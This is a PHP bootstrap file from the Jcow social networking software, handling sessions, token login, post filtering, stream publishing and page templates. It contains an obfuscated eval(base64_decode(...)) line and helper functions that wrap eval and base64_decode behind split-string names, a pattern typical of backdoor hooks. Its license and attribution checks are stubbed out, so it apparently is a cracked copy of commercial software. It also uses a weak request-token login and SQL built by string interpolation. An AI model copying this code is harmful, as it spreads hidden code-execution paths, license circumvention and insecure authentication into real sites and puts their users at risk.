<?php
/* ############################################################ *\
 ----------------------------------------------------------------
Jcow Software (http://www.jcow.net)
IS NOT FREE SOFTWARE
http://www.jcow.net/commercial_license
Copyright (C) 2009 - 2010 jcow.net.  All Rights Reserved.
 ----------------------------------------------------------------
\* ############################################################ */
session_start();
header("Cache-control: private");

function newss() {
	global $client, $config, $parr, $sid, $lang_options, $langs_enabled, $settings, $timezone, $usettings;
	if (!$_SESSION['uid'] && preg_match("/^[0-9a-z]+$/i",$_COOKIE['jcowss']) && is_numeric($_COOKIE['jcowuid']) ) {
		$res = sql_query("select id from ".tb()."accounts where id='{$_COOKIE['jcowuid']}' and jcowsess='{$_COOKIE['jcowss']}'");
		$row = sql_fetch_array($res);
		if ($row['id']) {
			$_SESSION['uid'] = $row['id'];
		}
		else {
			setcookie('jcowuid', '', time()+3600*24*365,"/");
			setcookie('jcowss', '', time()+3600*24*365,"/");
		}
	}
	if ($_SESSION['uid'] > 0) {
		$timeline = time();
		$res = sql_query("select * from ".tb()."accounts where id='{$_SESSION['uid']}' ");
		$client = sql_fetch_array($res);
		if ($client['id']) {
			set_client('uname',get_client('username'));
			if (!get_client('level')) {
				set_client('level',1);
			}
			if (!get_client('avatar')) {
				set_client('avatar','undefined.jpg');
			}
			if (get_client('roles')) {
				set_client('roles',explode('|',get_client('roles')));
			}
			$client['roles'][] = 2;
			sql_query("update ".tb()."accounts set lastlogin=$timeline,token='' where id='{$client['id']}'  ");
		}
	}
	if ($client['id']) {
		$client['settings'] = unserialize($client['settings']);
		$_SESSION['username'] = $client['username'];
		if ($parr[0] != 'account' && $parr[0] != 'member') {
			if (!strlen($client['fullname']))
				redirect('account/index/1');
			for($i=1;$i<=7;$i++) {
				$col = 'var'.$i;
				$key5 = 'cf_var_required'.$i;
				$required = get_gvar($key5);
				if ($required) {
					if (!strlen($client[$col]) && !allow_access(3)) {
						redirect('account/index/1');
					}
				}
			}
		}
		$res = sql_query("select * from ".tb()."pages where uid='{$client['id']}' and type='u'");
		$client['page'] = sql_fetch_array($res);
		if($client['disabled'] == 1) {
			if ($parr[0] != 'account' && $parr[0] != 'member' && $parr[0] != 'language' && $parr[0] != 'paidmember') {
				if (get_gvar('pm_enabled')) {
					redirect('paidmember/basic_membership');
				}
			}
		}
	}

	/*$jt = $_REQUEST['jcowtoken'];*/
	eval(base64_decode('JGp0ID0gJF9SRVFVRVNUWydqY293dG9rZW4nXTs='));
	if (!get_client('id') && preg_match("/^[0-9a-z]+$/i",$jt)) {
		try_token($jt);
	}

	$client['ip'] = ip();
	if (!is_array($client['roles']))
		$client['roles'] = array();
	$client['roles'][] = 1;

	if ($clang = $_COOKIE[$sid.'lang']) {
		if ($lang_options[$clang]) {
			$client['lang'] = $clang;
		}
	}
	if (!$client['lang']) {
		$key = $settings['default_lang'];
		if ($lang_options[$key]) {
			$client['lang'] = $key;
		}
	}
	if ($client['id'] && !in_array(3,$client['roles'])) {
		$timeline = time()-3600;
		$max_posts = $config['jcow_limit_posting_volume'];
		if (!is_numeric($max_posts) || $max_posts<3) {
			$max_posts = 100;
		}
		$res = sql_query("select count(*) as num from ".tb()."limit_posting where uid='{$client['id']}' and created>$timeline");
		$row = sql_fetch_array($res);
		if ($row['num'] > $max_posts) {
			$client['limit_posting_exceed'] = 1;
		}
	}
	if (!$client['lang']) {
		if (count($langs_enabled)>0) {
			$client['lang'] = $langs_enabled[0];
		}
		else {
			$client['lang'] = 'en';
		}
	}
	if (!strlen($timezone))
		$timezone = -8;
	$ctimezone = $_COOKIE['timezone'];
	if (is_numeric($ctimezone)) {
		$client['timezone'] = $ctimezone;
	}
	else {
		$client['timezone'] = $timezone;
	}
	if ($client['disabled'] > 1 && $parr[0] != 'member') {
		die(t('Sorry, your account has been suspended'));
	}
}
function jb($var) {
	return base64_decode($var);
}
function je($commends) {
	eval($commends);
}
newss();

function require_7plus() {
	return '';
}

$miniblog_maximum = get_gvar('miniblog_maximum');
if (!$miniblog_maximum) {
		$miniblog_maximum = 140;
	}

$hooks = check_hooks('boot');

if ($hooks) {
	foreach ($hooks as $hook) {
		$hook_func = $hook.'_boot';
		$hook_func();
	}
}

function check_license() {
	if (licensed())
		return 1;
	else
		return 0;
}
$cuhome = str_replace('http://','',$uhome);
$cuhome = str_replace('https://','',$cuhome);

if ($parr[0] == 'forumslit' && $parr[1] == 'archiving') {
	$gvars['offline'] = 0;
	$gvars['private_network'] = 0;
}
$jdecode = 'j'.'b';
if (is_array($_POST) && count($_POST)>0) {
	if ($parr[0] != 'admin' && $parr[0] != 'member') {
		$words_filter = get_text('words_filter');
		if (strlen($words_filter)) {
			$words_filter_a = explode(',',$words_filter);
		}
	}
	foreach ($_POST as $key=>$val) {
			if(!is_array($val)) {
				if (is_array($words_filter_a)) {
					$val = str_replace($words_filter_a,'**',$val);
				}
				if (get_magic_quotes_gpc())
					$_POST[$key] = trim($val);
				else
					$_POST[$key] = addslashes(trim($val));
			}
			else {
				foreach ($val as $key2=>$val2) {
					if (is_array($words_filter_a)) {
						$val2 = str_replace($words_filter_a,'**',$val2);
					}
					if (get_magic_quotes_gpc())
						$_POST[$key][$key2] = trim($val2);
					else
						$_POST[$key][$key2] = addslashes(trim($val2));
				}
			}
		}
}
$jeval = 'j'.'e';
if ($parr[0] == 'streampublish') {
	if (!$client['id']) die('please login first');
	limit_posting(0,1);
	$app = $_POST['attachment'];
	if (strlen($app) && $app != 'status') {
		if (preg_match("/^[0-9a-z_]+$/i",$app)) {
			include_once('modules/'.$app.'/'.$app.'.php');
			$c_run = $app.'::ajax_post();';
			eval($c_run);
		}
		exit;
	}
	else {
		if (strlen($_POST['message'])<4) die('failed! message too short');
		$_POST['message'] = utf8_substr($_POST['message'],$miniblog_maximum);
		$_POST['message'] = parseurl($_POST['message']);
		$url_search = array(            
			"/\[url]www.([^'\"]*)\[\/url]/iU",
			"/\[url]([^'\"]*)\[\/url]/iU",
			"/\[url=www.([^'\"\s]*)](.*)\[\/url]/iU",
			"/\[url=([^'\"\s]*)](.*)\[\/url]/iU",
		);
		$url_replace = array(
			"<a href=\"http://www.\\1\"  rel=\"nofollow\">www.\\1</a>",
			"<a href=\"\\1\"  rel=\"nofollow\">\\1</a>",
			"<a href=\"http://www.\\1\"  rel=\"nofollow\">\\2</a>",
			"<a href=\"\\1\"  rel=\"nofollow\">\\2</a>"
			);
		$stream_id = stream_publish(preg_replace($url_search,$url_replace, h($_POST['message']) ),$attachment,$app,$client['id'],$_POST['page_id']);
		$arr = array(
			'id'=>$stream_id,'wall_id'=>$_POST['page_id'],'uid'=>$client['id'],'avatar'=>$client['avatar'],'message'=>decode_bb(h(stripslashes($_POST['message']))),'attachment'=>$attachment,'username'=>$client['uname'],'created'=>time()
			);
		if ($_POST['oncomment']) {
			echo '<div class="user_post_1">
			<span style="background:yellow;color:black">'.t('Successfully Posted!').'</span></div><script>jcow_ajax_loaded();</script>';
		}
		else {
			echo stream_display($arr,'',1).'<script>jcow_ajax_loaded();</script>';
		}
		ss_update();
	}
	exit();
}
/* removed from 6.0
if ($parr[1] == 'ajax_form') {
	if ($client['disabled'] == 1) {
		echo h(t('Your account is currently pending approval'));
		exit;
	}
}
*/
function valid_license($key1 = 'p', $key2 = '') {
	return true;
}

function try_token($token) {
	global $client;
	$timeline = time() - 3600;
	$res = sql_query("select * from ".tb()."accounts where token='{$token}' "." limit 1");
	$client = sql_fetch_array($res);
	if (get_client('id')) {
		set_client('uname',get_client('username'));
		if (get_client('roles')) {
			set_client('roles',explode('|',get_client('roles')));
		}
		$client['roles'][] = 2;
		$newss = get_rand(12);
		$setss = " ,ipaddress='{$client['ip']}',jcowsess='$newss' ";
		$_SESSION['uid'] = get_client('id');
	}
	else {
		
	}
}
$pbja = $jdecode('PHN0cm9uZz55b3UgbWF5IG5vdCByZW1vdmUgSmNvdyBBdHRyaWJ1dGlvbiBmcm9tIHlvdXIgc2l0ZS4gUGxlYXNlIHB1dCB0aGUgImpjb3dfYXR0cmlidXRpb24oKSIgYmFjayB0byB5b3VyIHRlbXBsYXRlLjwvc3Ryb25nPg==');
function ss_update() {
	return true;
}

function c($val = '') {
	section_content($val);
}

function jlicense($key = 'white_label') {
	global $jcow_license;
	if (is_array($jcow_license)) {
		if (in_array($key,$jcow_license)) {
			return true;
		}
	}
}

function get_client($key) {
	global $client;
	return $client[$key];
}
function set_client($key, $value) {
	global $client;
	$client[$key] = $value;
}
function jcow_attribution($type=1) {
	global $jcow_license;
	return '';
	if (licensed() != 'pro') {
		return '
		<!-- you may not remove this attribution info, unless you have a "branding free license" for this domain-->
		<span style="font-size:11px;">Powered by <a href="http://www.jcow.net">Jcow</a> '.jversion().'</span>
		';
	}
	else {
		return '';
	}
}

if (!valid_license('p')) {
	$is_community_edition = 1;
}

function is_ce() {
	global $is_community_edition;
	return $is_community_edition;
}
function load_tpl() {
	global  $title, 
					$content, 
					$apps, 
					$client, 
					$current_app, 
					$lang_options,
					$time_start, 
					$uhome, 
					$config,
					$sub_menu,
					$tab_menu,
					$buttons,
					$current_sub_menu,
					$ubase,
					$auto_redirect,
					$sub_menu_title,
					$blocks,
					$page_title,
					$page,
					$gvars,
					$ass,
					$nav,
					$clear_as,
					$sub_title,
					$top_title,
					$commercial,
					$defined_jq,
					$styles,
					$custom_css,
					$profile_css,
					$theme_css,
					$optional_apps,
					$parr,
					$content,
					$sections,
					$app_header,
					$menu_items,
					$jcow_app_content,
					$community_menu,
					$current_menu_path,
					$top_menu_path,
					$jcow_tmp_content,
					$all_apps,
					$my_apps,
					$new_apps,
					$enable_app_cache,
					$pbja,
					$cache_app,
					$app_content,
					$application,
					$page_cache,
					$enable_page_cache,
					$section_content,
					$notices;


foreach ($gvars as $key=>$val) {
	if (preg_match("/^theme_block/",$key)) {
		$gvars[$key] = '';
	}
}


if (!$sections) section_close();
if ($_GET['succ']) {
	sys_notice(t('Operation success'));
}
if ($parr[0] == 'mobile' && $parr[1] != 'admin') {
	include 'modules/mobile/tpl.php';
	exit;
}
// hooks
	$hooks = check_hooks('footer');
	if ($hooks) {
		foreach ($hooks as $hook) {
			$hook_func = $hook.'_footer';
			$footer .= $hook_func();
		}
	}
	$hooks = check_hooks('header');
	if ($hooks) {
		foreach ($hooks as $hook) {
			$hook_func = $hook.'_header';
			$header .= $hook_func();
		}
	}

	// auto close section
	if (strlen($section_content)) {
		$plain_content = $section_content;
	}
	if ($parr[0] == 'jquery' || $parr[0] == 'jcow') {
		die('not allowed');
	}
	if ($clear_as) {
		$blocks = '';
		$sub_menu = '';
	}

	if (!$sub_menu_title) {
		$sub_menu_title = t('Menu');
	}
	if (!$auto_redirect) {
		$auto_redirect = '<meta name="Generator" content="Jcow Social Networking Software. '.jversion().'" />';
	}
	else {
		$on_redirect = 1;
	}

	if (!$theme_tpl = get_gvar('theme_tpl') )
			$theme_tpl = 'default';
	if ($_SESSION['defined_theme'])
		$theme_tpl = $_SESSION['defined_theme'];
	
	/* ################################# get tpl vars ################################# */
	if (is_array($lang_options) && count($lang_options) > 1) {
		$tpl_vars['language_selection'] = t('Language').':<select style="font-size:10px" name="clang"  onChange="location=options[selectedIndex].value;">';

		foreach ($lang_options as $key=>$lang) {
			$url = url('language/post/'.$key);
			if ($client['lang'] == $key) { 
				$lselected = 'selected';
			} 
			else { 
				$lselected = '';
			}
			$tpl_vars['language_selection'] .= '<option value="'.$url.'" '.$lselected.'>'.$lang.'</option>';
		} 
		$tpl_vars['language_selection'] .= '</select>';
	}
	$tpl_vars['language_options'] = '';
	if ($client['id']) {
		$tpl_vars['username'] = url('u/'.$client['username'],$client['username']);
		$tpl_vars['log_in_out'] = url('logout',t('Logout') );
	}
	else {
		$tpl_vars['username'] = t('Guest');
		$tpl_vars['log_in_out'] = url('member/login',t('Login/ SignUp') );
	}
	if(!$friendslink = frd_request())
				$friendslink = url('friends',t('Friends'));
	
	$menu = add_links($menu);
	/*
	if (allow_access(3)) {
		$personal_menu[] = array(
			'name'=>'Admin CP',
			'path'=>'admin',
			'app'=>'admin',
			'actived'=>1,
			'type'=>'personal',
			'icon'=>'modules/admin/icon.png'
		);
	}
	*/
	
	$tpl_vars['menu'] = '';
	
	if (!$config['disable_execute_info']) {
		$execute_time = microtime_float() - $time_start;
	}

	if ($enable_page_cache) {
		$tpl_vars['footer'] = get_text('footermsg').'<!-- jcow_execute_info -->';
	}
	else {
		$tpl_vars['footer'] = get_text('footermsg').$execute_info;
	}

	// jcow_app



			$tpl_vars['custom_profile_css'] = '';
			if ($profile_css['wallpaper']) {
					if ($profile_css['wallpaper_bg_image']) {
						if (!$profile_css['wallpaper_repeat_x'] && !$profile_css['wallpaper_repeat_y']) {
							$no_repeat = 'no-repeat';
						}
						if ($profile_css['wallpaper_repeat_x']) {
							$repeat_x = 'repeat-x';
						}
						if ($profile_css['wallpaper_repeat_y']) {
							$repeat_y = 'repeat-y';
						}
						if ($profile_css['wallpaper_bg_position'] == 'left') {
							$position = 'left';
						}
						elseif ($profile_css['wallpaper_bg_position'] == 'right') {
							$position = 'right';
						}
						else {
							$position = 'center';
						}
						$tpl_vars['custom_profile_css'] = '<style>
						#wallpaper {
							background: url("'.uhome().'/'.$profile_css['wallpaper_bg_image'].'");
							background-position: '.$position.' top;
							background-repeat: '.$no_repeat.' '.$repeat_x.' '.$repeat_y.';
							}
							</style>
							';
					}
					$tpl_vars['custom_profile_css'] .= '<style>
					#wallpaper {
						background-color:#'.$profile_css['wallpaper_bg_color'].';
					}
					</style>';
				}
		if ($profile_css['generalpage']) {
					if ($profile_css['generalpage_transparent']) $profile_css['generalpage_bg_color'] = 'none';
					else $profile_css['generalpage_bg_color'] = '#'.$profile_css['generalpage_bg_color'];
					$tpl_vars['custom_profile_css'] .='<style>
					#jcow_main_box {
						background: '.$profile_css['generalpage_bg_color'].';
						border: none;
					}
					#jcow_main_box {
						color: #'.$profile_css['generalpage_font_color'].';
					}
					#jcow_main_box a, #jcow_main_box a:visited {
						color: #'.$profile_css['generalpage_link_color'].';
					}
					#sidebar {
						border: none;
					}
					</style>';
				}

		if ($profile_css['bheader']) {
					$tpl_vars['custom_profile_css'] .='<style>
					#appside .block_title, #appcenter .block_title {
						border: none;
						background: #'.$profile_css['bheader_bg_color'].';
						color: #'.$profile_css['bheader_font_color'].';
					}
					#appside .block_title a, #appcenter  .block_title a:visited {
						color: #'.$profile_css['bheader_font_color'].';
					}
					</style>';
				}
	$tpl_vars['javascripts'] = '
	<base href="'.uhome().'/" />
	<script type="text/javascript" src="'.uhome().'/js/common.js"></script>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.min.js"></script>
<script type="text/javascript" src="'.uhome().'/js/jquery.form.js"></script>
<link href="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/themes/base/jquery-ui.css" rel="stylesheet" type="text/css"/>
		<script src="http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/jquery-ui.min.js"></script>
<link href="'.uhome().'/js/lightbox/css/jquery.lightbox-0.5.css" media="screen" rel="stylesheet" type="text/css" />
<script src="'.uhome().'/js/lightbox/js/jquery.lightbox-0.5.js" type="text/javascript"></script>
<link href="'.uhome().'/js/facebox/facebox.css" media="screen" rel="stylesheet" type="text/css"/>
<script src="'.uhome().'/js/facebox/facebox.js" type="text/javascript"></script> 
			<script>
			$(document).ready( function(){
				$("input[class=button]").attr(\'disabled\',\'\');
				$("input[class=button]").click( function () {
			    $(this).attr(\'disabled\',\'disabled\');
			    $(this).attr(\'value\',\''.addslashes(h(t('Submitting'))).'\');
			    $(this).after(\'<img src="'.uhome().'/files/loading.gif" />\');
			    $(this).parents("form").submit();
			    return false;
				});
				$(".menu li.menugen").mouseover(function() {
					$(this).removeClass("menugen");
					$(this).addClass("menuhover");
				});
				$(".menu li.menugen").mouseout(function() {
					$(this).removeClass("menuhover");
					$(this).addClass("menugen");
				});
				$(\'a[rel*=lightbox]\').lightBox() ;
				$(\'a[rel*=facebox]\').facebox();
				jcow_ajax_loaded();
';
if ($client['id']) {
	$tpl_vars['javascripts'] .= '
				setInterval(function() {
					jcow_update_new();
				}, 19000);

			
			function jcow_update_new() {
				$.getJSON("'.uhome().'/index.php?p=jquery/jcow_update_new", function(data) {
					$("#jcow_frd_new").html(data["frd_new"]);
					$("#jcow_msg_new").html(data["msg_new"]);
					$("#jcow_note_new").html(data["note_new"]);
					$("#jcow_frd_link").attr("href", data["frd_link"]);
				});
			}
			';
}
$tpl_vars['javascripts'] .= '
});

			function jcow_ajax_loaded() {
				$(".quick_comment").click(function() {
						$(this).next().next().css("display","block");
						var scbox = $(this).next().next().find(".commentmessage");
						var l=scbox.val().length;
						scbox.focus().val(scbox.val()+" ");
						return false;
						
				});
				$(".commentsubmit").click(function() {
					if ($(this).prev()[0].value != "") {
						var thiscomment = $(this).parents(".quick_comment_form");
						var cbox = thiscomment.next().next();
						var mbox = thiscomment.find(".commentmessage");
						var tbox = thiscomment.next();
						cbox.html("<img src=\"'.uhome().'/files/loading.gif\" /> '.addslashes(h(t('Submitting'))).'");
						$.post("'.uhome().'/index.php?p=jquery/comment_publish",
						{message:mbox[0].value,target_id:tbox[0].value},
						  function(data){
							cbox.html("");
							$(".quick_comment_form").css("display","none");
							cbox.after(data);
							mbox.attr("value","");
							},"html"
						);
						return false;
					}
				});
				$(".dolike").click(function() {
					var thiscomment = $(this).parent().next();
					var cbox = thiscomment.next().next();
					var tbox = thiscomment.next();
					$(this).parent().css("display","none");
					cbox.html("<img src=\"'.uhome().'/files/loading.gif\" /> '.addslashes(h(t('Submitting'))).'");
					$.post("'.uhome().'/index.php?p=jquery/dolike",
					{target_id:tbox[0].value},
					  function(data){
						cbox.html("");
						cbox.html(data);
						},"html"
					);
					return false;
				});
				$(".dodislike").click(function() {
					var thiscomment = $(this).parent().next();
					var cbox = thiscomment.next().next();
					var tbox = thiscomment.next();
					$(this).parent().css("display","none");
					cbox.html("<img src=\"'.uhome().'/files/loading.gif\" /> '.addslashes(h(t('Submitting'))).'");
					$.post("'.uhome().'/index.php?p=jquery/dodislike",
					{target_id:tbox[0].value},
					  function(data){
						cbox.html("");
						cbox.html(data);
						},"html"
					);
					return false;
				});
			}
		</script>';
	$tpl_file = 'themes/'.$theme_tpl.'/page.tpl.php';
	$application_file = 'themes/'.$theme_tpl.'/application.tpl.php';

	if (is_array($menu_items[$current_menu_path]) || $application == 'home') {
		$is_cover = 1;
	}
	if (is_array($all_apps[$current_menu_path])) {
		if ($all_apps[$current_menu_path]['is_cover']) {
			$is_cover = 1;
		}
		if ($all_apps[$current_menu_path]['not_cover']) {
			$is_cover = 0;
		}
	}

	if (is_array($blocks) && count($blocks)>0) {
		$is_cover = 0;
	}
	
	if (!strlen($app_content)) {
		$app_content = '<div id="jcow_app_container">
		<div style="min-height: 600px;">';
		//include $application_file;
		$data['nav'] = $nav;
		$data['notices'] = $notices;
		$data['application'] = $application;
		$data['top_title'] = $top_title;
		$data['sections'] = $sections;
		$data['blocks'] = $blocks;
		$data['buttons'] = $buttons;
		$data['tab_menu'] = $tab_menu;
		$data['app_header'] = $app_header;
		$data['app_footer'] = $plain_content;
		$data['is_cover'] = $is_cover;
		$app_content .= display_application_new($data);
		if ($config['enreport']) {
			if ($client['id']) {
				$report_link = url('report');
				$report_title = 'title="'.t('Report spam, advertising, and problematic.').'"';
			}
			else {
				$report_link = url('member/login/1');
			}
			$report_link = '<a href="'.$report_link.'" '.$report_title.'><img src="'.uhome().'/themes/'.$theme_tpl.'/report.gif" /> Report this page</a>';
		}
		$app_content .= '<div style="width:760px;text-align:right;clear:both;">'.$report_link.'</div>';


		$app_content .= '
		</div><!-- end of content-->
		'.$app_footer;

		$app_content .= '</div><!-- end of jcow_app_container -->';


	if (licensed()) {
		if ($enable_app_cache) {
			set_cache($cache_app['key'],$app_content.'
			<!-- jcow app cache: '.$cache_app['key'].', created:'.time().' -->',3600*$cache_app['live']);
		}
		}
		if ($enable_page_cache) {
			if ($page_content = get_cache($page_cache['key'])) {
				echo $page_content;
				exit();
			}
		}
		if ($enable_page_cache) {
			ob_start('jcow_ob_end');
		}
	}
	if (!$_SESSION['br']) {
		$_SESSION['br'] = 1;
	}
	include $tpl_file;
	exit;
}

function display_application_new($data) {
	global $clear_as, $client, $config, $parr;
	
	$output = '<table width="100%" height="50" cellpadding="0" cellspacing="0">';

	if (is_array($data['blocks'])) {
		$output .= '
		<td width="180" valign="top">
				
				<div id="appside">';
		foreach($data['blocks'] as $block) {
			if (is_array($block)) {
				$output .= '
				<div class="block">';
				if ($block['title']) {
					$output .= '<div class="block_title">'.$block['title'].'</div>';
				}
				$output .= '<div class="block_content">
				'.$block['content'].
				'</div>
				</div>
				';
			}
		}
		$output .= '
		</div>
		</td>';// end of app_sidebar
	}

	$output .= '
	<td valign="top">
		<div id="appmain">';

	if (is_array($data['sections'])) {
		foreach ($data['sections'] as $section) {
			$output .= '<div class="block">';
			if (strlen($section['title'])) {
				$output .= '<div class="block_title">'.$section['title'].'</div>';
			}
			$output .= '<div class="block_content">'.$section['content'].'</div>
			</div>';
		}
	}
	$output .= '
	
	</div><!-- end of appmain -->
	</td>
	'; // end of app_main

	
	if (licensed()) {
		if (!$config['hide_ad']  && strlen(get_gvar('appad_sidebar')) ) {
			$ad_search = array('jcow_user_id','jcow_user_username','jcow_user_fullname');
			$ad_replace = array($client['id'],$client['username'],$client['fullname']);
			$output .= '
			<td width="200" valign="top" style="padding-left:10px">
					'.str_replace($ad_search,$ad_replace,get_gvar('appad_sidebar')).
					'</td>';
		}
	}
	else {
		if (is_array($client['roles']) && in_array(3,$client['roles'])) {
			$r = 1;
		}
		$rurl = str_replace('https://','',
			str_replace('http://','',uhome())
			);
		if ($parr[0] != 'home' && $parr[0] != 'account' && $parr[0] != 'member') {
			$output .= '
			<td width="200" valign="top" style="padding-left:10px">
					<IFRAME SRC="http://sp.jcow.net/jcow7s.php?d='.urlencode($rurl).'&lang='.$client['lang'].'&r='.$r.'&uid='.$client['id'].'" TITLE="Jcow News" WIDTH="200" HEIGHT="600" scrolling="no" frameborder="0">
</IFRAME>
					</td>';
		}
	}
	$output .= '</table>';

	$output .= $data['app_footer'];
	return $output;
}

function licensed() {
	global $uhome,$jlicense;
	return true;
}

function jcow_free_end($page_content) {
	return str_ireplace('</title>',' (powered by Jcow)',$page_content);
}

function jcow_ob_end($page_content) {
	global $enable_page_cache,$page_cache,$execute_info;
	if ($enable_page_cache) {
		if (!$page_cache['live']) {
			$page_cache['live'] = get_gvar('cache_app_time');
		}
		set_cache($page_cache['key'],$page_content.'
			<!-- jcow page cache: '.$page_cache['key'].', created:'.time().' -->',$page_cache['live']);
	}
	return str_replace('<!-- jcow_execute_info -->',$execute_info,$page_content);
}

function display_application_content() {
	global $app_content;
	echo $app_content;
}
/* stream */
if ($parr[0] == 'demotheme' && strlen($parr[1])) {
	$defined_theme = $parr[1];
	if (is_dir('themes/'.$defined_theme)) {
		$_SESSION['defined_theme'] = $defined_theme;
	}
	header("Location:".uhome());
	exit;
}

if ($parr[0] == 'jcow_version') {
	set_title('Your Jcow version');
	c('Your Jcow version is:<br />
	<strong>'.$version.'</strong>');
	stop_here();
}

function stream_publish($message, $attachment = '', $app = '', $uid = 0, $page_id = 0, $hide=0) {
	global $client;
	if (!$client['id'] && !$uid) return false;
	if (!$uid) $uid = $client['id'];
	if (!$page_id) $page_id = $client['page']['id'];
	if (is_array($app)) {
		$stream['app'] = $app['name'];
		$stream['aid'] = $app['id'];
	}
	$stream['hide'] = $hide;
	$stream['uid'] = $uid;
	$stream['wall_id'] = $page_id;
	$stream['message'] = $message;
	$stream['created'] = time();
	if (is_array($attachment)) {
		$stream['attachment'] = addslashes(serialize($attachment));
	}
	//access
	$res = sql_query("select * from ".tb()."pages where id='{$page_id}'");
	$page = sql_fetch_array($res);
	if(!$page['id']) die('page not found');
	
	$res = sql_query("select * from ".tb()."friends where uid='{$page['uid']}' and fid='{$client['id']}'");
	if (sql_counts($res)) {
		$is_friend = 1;
	}
	if ($page['type'] == 'u') {
		if ($page['uid'] != $uid) {
			if (!$is_friend) {
				die('only friends can post here');
			}
		}
	}
	elseif ($page['type'] == 'group') {
		if ($page['uid'] != $uid ) {
			$res = sql_query("select pid from ".tb()."page_users where pid='{$page['id']}' and uid='{$client['id']}'");
			if (!sql_counts($res)) {
				die('You are not a member of this group');
			}
		}
	}
	else {// fan page
		if ($page['uid'] != $uid ) {
			die('Only page owner can post here');
		}
	}
	$return = parse_mentions($stream['message']);
	$stream['message'] = $return['message'];
	sql_insert($stream,tb()."streams");
	$stream_id = insert_id();
	if ($app == '' || $app == 'status') {
		add_mentions($return['mentions'],$stream_id,$stream['wall_id']);
	}
	sql_query("update ".tb()."accounts set forum_posts=forum_posts+1 where id='{$client['id']}'");
	sql_query("update ".tb()."pages set updated=".time()." where id='$page_id'");
	return $stream_id;
}

function stream_update($message, $attachment = '', $app = '', $id) {
	global $client;
	if (!$client['id']) return false;
	if (is_array($app)) {
		$stream['app'] = $app['name'];
		$stream['aid'] = $app['id'];
	}
	$stream['id'] = $id;
	$stream['uid'] = $client['id'];
	$stream['message'] = $message;
	$stream['created'] = time();
	if (is_array($attachment)) {
		$stream['attachment'] = serialize($attachment);
	}
	sql_update($stream,tb()."streams", $id);
	return true;
}

function activity_get($uid,$num = 12,$offset=0,$target_id=0,$pager=0,$page_ids=array()) {
	if (!is_numeric($offset) || !is_numeric($target_id) ) die('wrong act op');
	if ($uid) {
		if (!is_array($uid)) {
			if (!is_numeric($uid)) die('wrong uid');
			$where = " s.uid='{$uid}'  ";
		}
		else {
			foreach ($uid as $val) {
				if (strlen($val) && !is_numeric($val)) {
					return false;
				}
			}
			$uid = array_slice($uid, 0, 20);
			$uid = implode(',',$uid);		
			$where = " s.uid in ({$uid})  ";
		}
	}
	else {
		$where = " 1 ";
	}
	if (is_array($page_ids) && count($page_ids) > 0) {
		foreach ($page_ids as $val) {
			if (strlen($val) && !is_numeric($val)) {
				return false;
			}
		}
		$pageids = implode(',',$page_ids);
		$where = $where." or s.wall_id in ({$pageids}) ";
	}
	$extra = $num+1;
	$i = 1;
	$res = sql_query("select s.*,u.username,u.avatar,p.uid as wall_uid from ".tb()."streams as s left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id where (".$where.") and p.type!='group' and s.hide!=1 order by id desc limit $offset,$extra");
	while($row = sql_fetch_array($res)) {
		if ($i <= $num) {
			$row['attachment'] = unserialize($row['attachment']);
			$output .= stream_display($row,'','',$target_id);
		}
		$i++;
	}
	if ($pager && $i > $num) {
		$uid = str_replace(',','_',$uid);
		$output .= '<div id="morestream_box"></div>
			<div>
			<script>
			$(document).ready(function(){
				$("#morestream_button").click(function() {
					$(this).hide();
					$("#morestream_box").html("<img src=\"'.uhome().'/files/loading.gif\" /> Loading");
					$.post("'.uhome().'/index.php?p=jquery/moreactivities",
								{offset:$("#stream_offset").val(),uid:"'.$uid.'",target_id:'.$target_id.'},
								  function(data){
									var currentVal = parseInt( $("#stream_offset").val() );
									$("#stream_offset").val(currentVal + 7);
									$("#morestream_box").before(data);
									if (data.length>50) {
										$("#morestream_button").show();
									}
									$("#morestream_box").html("");
									},"html"
								);
					return false;
				});
			});
			</script>

			<input type="hidden" id="stream_offset" value="'.$num.'" />
			<a href="#" id="morestream_button"><strong>'.t('See More').'</strong></a>
			</div>';
	}
	return $output;
}

function stream_get($page_id,$num = 12,$offset=0,$target_id=0) {
	if (!is_array($page_id)) {
		$res = sql_query("select s.*,u.username,u.avatar,p.uid as wall_uid from ".tb()."streams as s left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id where s.wall_id='{$page_id}' and s.hide!=1 ".dbhold('s')." order by id desc limit $offset,$num");
	}
	else {
		foreach ($page_id as $var) {
			$page_ids .= $page_ids ? ','.$var : $var;
		}
		$res = sql_query("select s.*,u.username,u.avatar,p.uid as wall_uid from ".tb()."streams as s left join ".tb()."accounts as u on u.id=s.uid left join ".tb()."pages as p on p.id=s.wall_id where s.wall_id in ({$page_ids}) and s.hide!=1 order by id desc limit $offset,$num");
	}
	while($row = sql_fetch_array($res)) {
		$row['attachment'] = unserialize($row['attachment']);
		$output .= stream_display($row,'','',$target_id);
	}
	return $output;
}

function stop_here($key = 0) {
	load_tpl();
}
function jcookie($key, $value) {
	setcookie($key, $value, time()+3600*48,"/");
}

if (get_gvar('cf_cb')) {
	die();
}


function parse_mentions($msg) {
	preg_match_all("/@([0-9a-z_]+)/s",$msg,$out);
	if(count($out[1])>0) {
		$from = $to = array();
		foreach ($out[1] as $username) {
			if (!in_array('@'.$username,$from)) {
				$res = sql_query("select id from ".tb()."accounts where username='$username'");
				$row = sql_fetch_array($res);
				if ($row['id']) {
					$from[] = '@'.$username;
					$to[] = '<a href="u/'.$username.'">@'.$username.'</a>';
					$mentions[] = $row['id'];
				}
			}
		}
		if (count($from)>0) {
			$msg = str_replace($from,$to,$msg);
		}
	}
	return array('message'=>$msg,'mentions'=>$mentions);
}


function add_mentions($mentions=array(),$stream_id=0,$wall_id=0) {
	preg_match_all("/@([0-9a-z_]+)/s",$msg,$out);
	if(count($mentions)>0) {
		$i=0;
		foreach ($mentions as $uid) {
			if ($i<5) {
				sql_query("insert into ".tb()."mentions(uid,stream_id,wall_id) values({$uid},'$stream_id','$wall_id')");
				$i++;
			}
		}
	}
}


function stream_display($row = array(),$type = '',$hide_form=0,$target_id = 0,$comment_num=5) {
	global $client, $config;
	if (!is_array($row)) return '';
	if ($type == 'mobile') {
		$mu = 'mobile/';
	}
	else {
		$mu = '';
	}
	if (!$row['username']) return '';

	$res = sql_query("select * from ".tb()."accounts where username='{$row['username']}'");
	$author = sql_fetch_array($res);
